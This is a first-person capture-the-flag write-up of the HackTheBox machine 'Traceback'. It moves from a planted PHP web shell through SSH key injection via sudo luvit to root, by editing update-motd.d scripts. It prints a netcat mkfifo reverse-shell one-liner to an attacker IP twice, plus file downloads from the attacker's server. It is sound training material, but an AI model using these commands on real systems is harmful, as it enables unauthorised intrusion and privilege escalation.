Hey guys, this is my writeup for the `HackTheBox` machine `Traceback`. This is my first writeup so it won't be perfect. This was an Easy rated Linux box, The machine starts of with a `web server` that has been `compromised` and defaced, the hacker leaves a `backdoor` behind "for all the net" :), so we do some guess work and find the shell left behind and that's the `foothold`. after accessing the `reverse shell` we do some recon and find that we can run `luvit` with `sudo privileges`, i then write an `ssh key` to the `sysadmins` ssh folder and get a shell as the `sysadmin`, for `root` we have a cron running with administrative privileges that runs everytime on a ssh login, we have the ability write the files that are executed when the cron runs.

So first things first, i run an nmap scan

{% highlight bash %}

  # Nmap 7.80 scan initiated Sun Aug 16 14:15:10 2020 as: nmap -sC -sV -T4 -oA nmap/traceback -Pn 10.10.10.181

Usually i runa full port scan after this one, but there were no other open ports. So we have ssh and an apache web server, looking at the web server, we have an interesting index page....

![web page](/img/tr_web_page_index.png)

So now we have to find this backdoor now, so next i look at the page source, and there's an interesting comment.

![page source](/img/tr_page_source.png)

So i copied the comment and googled it, it brought me to a [github repository][shells] with a list of web shells, i could've done a better job at guessing which web shell was running on the server but i instead decided to start at the bottom of the list entering each file name, luckily the one i was looking for was second last, but i would normally run a gobust.

{% highlight bash%}
gobuster dir -u http://10.10.10.181/ -w [wordlist] -t 25 -x php,txt -outfile.txt
{% endhighlight %}

![shell](/img/tr_shell.png)

So we got the hit from smevk.php, so the default credentials are admin:admin from looking at the source code of the reverse shell.

![system](/img/tr_smevk.png)

So this php reverse shell script seems to have a lot of funtionality, but i prefer looking around using a shell, we're able to run system commands on one of the form fields so i set a netcat listener and give myself a reverse shell on the machine.

The reverse shell command :
{% highlight bash %}

$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.114 9001>/tmp/f

{% endhighlight %}

The listener :
{% highlight bash %}

rlwrap nc -lvnp 9001

{% endhighlight %}

`rlwrap` allows to use the arrow keys on the netcat shell.

We get a shell :) and use python to get the tty.

![shell](/img/tr_shell_webadmin-1.png)

After this shell i spent a lot of time looking around around, which is why i think doing writeups is weird because we don't show the rabbit hoels we went down XD. but i get it the wriiteup would be a 50 mintue read if we did :)

So since we're running as `webadmin` i check he's home folder, we find a note.

![note](/img/tr_note.png)

So usually on linux i run `LinEnum` and `LinpPeas`, so on the linpeas we have find interesting stuff.... 

So i copy the binaries to my working directory and start a `python` webserver.

{% highlight bash %}
python3 -m http.server 8080
{% endhighlight %}

On the box i use whatever i can to download files, but i like using `wget`
{% highlight bash %}
wget http://10.10.14.114:8080/[file_name]
{% endhighlight %}

![sudo](/img/tr_sudo_perms.png)

I could've also got this with just `sudo -l`, but sometimes when you get a shell you forget the simplest things.

So we can execute the `Luvit` program with sysadmin privileges, Luvit allows us to run `Lua` code, my first idea was to execute system commands through Lua, after a gazillion tries i gave up because it just wouldn't work. So then i attempted to write my piublic ssh key to `authorized_keys` after a few minutes of figuring out how to do that in `Lua`.

Creating an ssh key is easy, just run...

{% highlight bash %}
ssh-keygen -f traceback
{% endhighlight %}

This is the code to append my ssh key to the authorized_keys file

![code](/img/tr_code.png)

Then executed the Lua script with sysadmin privileges.

{% highlight bash %}
sudo -u sysadmin /home/sysadmin/luvit spek.lua
{% endhighlight %}

Then i try login to ssh with the key, but before i do that i have to change the permissions on the key

{% highlight bash %}
chmod 600 traceback
{% endhighlight %}

And i was in as `sysadmin`

![ssh](/img/tr_ssh_sysadmin.png)

On the `LinPeas` output i also saw something else that was interesting, we could write files in the `/etc/update-motd.d`
when i login with ssh run parts executes all the scripts in the directory, these scripts are also backep up every 30 seconds  , 
i found this out after some time analyzing what was happening. i think this was also a way for the hacker to have a way to have root privileges in an easy and hidden way.

![ls_w](/img/tr_ls_w.png) 

After seeing that i ran [Pspy][pspy], a tool for analyzing linux system processes. This is when i saw the backups of the scripts in `/etc/update-motd.d` where being made every 30 seconds.

![ps_py](/img/tr_pspy.png)

This is also means if i modify the one of scripts in this directory it will be removed in 30 seconds.
when i log in with ssh run-parts executes the scripts in `/etc/update-motd.d`.

![run-parts](/img/tr_ssh_pspy.png)

So my method to get root here is simeple now, i have to put a reverse shell command inside one of these scripts owned and executed by root and have a listener.

{% highlight bash %}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.114 9002>/tmp/f
{% endhighlight %}

After making this modification i have to login with ssh during the 30 second period of the scripts not being backed up, after i login i get the root shell.
